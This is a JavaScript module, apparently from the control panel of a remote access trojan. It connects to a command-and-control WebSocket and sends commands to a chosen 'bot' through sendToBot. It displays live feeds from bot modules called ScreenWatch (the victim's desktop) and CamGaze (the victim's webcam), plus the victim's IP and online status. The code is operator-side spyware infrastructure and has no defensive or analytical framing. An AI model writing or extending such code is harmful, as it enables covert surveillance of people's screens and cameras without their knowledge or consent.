import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';

let ws, timer;
const targetId = new URLSearchParams(location.search).get('id');

const upUI = (id, val) => {
    const el = document.getElementById(id);
    if (!el) return;
    el.textContent = val;
    if (id === 'clientStatus') el.className = `value status-${val.toLowerCase()}`;
};

const activateOnline = () => {
    clearTimeout(timer);
    upUI('clientStatus', 'online');
    timer = setTimeout(() => upUI('clientStatus', 'offline'), 5000);
};

export function initControlConnection() {
    const [token, login] = [localStorage.getItem('auth_token'), localStorage.getItem('user_login')];
    if (!token || !targetId) return;

    ws = new WebSocket(`${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}/ws?login=${encodeURIComponent(login)}&token=${token}`);
    ws.binaryType = 'arraybuffer';
    window.c2WebSocket = ws;

    ws.onopen = () => {
        setInterval(() => ws?.readyState === 1 && ws.send(encodePacket("0", "ping")), 25000);
        window.sendToBot('DataScribe', 'get_metadata');
    };

    ws.onmessage = ({ data }) => {
        const pkg = decodePacket(data);
        if (!pkg || (pkg.id !== targetId && pkg.id !== "0")) return;

        if (pkg.module === 'DataScribe') {
            try {
                const d = JSON.parse(new TextDecoder().decode(pkg.payload));
                upUI('clientId', targetId);
                if (d.ip && d.ip !== "0.0.0.0") upUI('clientIp', d.ip);
                if (d.status === 'online') activateOnline();
            } catch (e) { console.error("DataScribe error"); }
            return;
        }

        // Любой пакет от бота (ScreenWatch, CamGaze и т.д.) подтверждает онлайн
        if (pkg.id === targetId) activateOnline();

        // Роутинг на функции отрисовки
        const routes = {
            'ScreenWatch': window.updateDesktopFeed,
            'CamGaze': window.updateWebcamFeed
        };
        routes[pkg.module]?.(pkg.payload);
    };

    window.sendToBot = (mod, pay = "") => {
        if (ws?.readyState !== 1) return;
        const data = typeof pay === 'string' ? new TextEncoder().encode(pay) : pay;
        ws.send(encodePacket(targetId, mod, data));
    };
}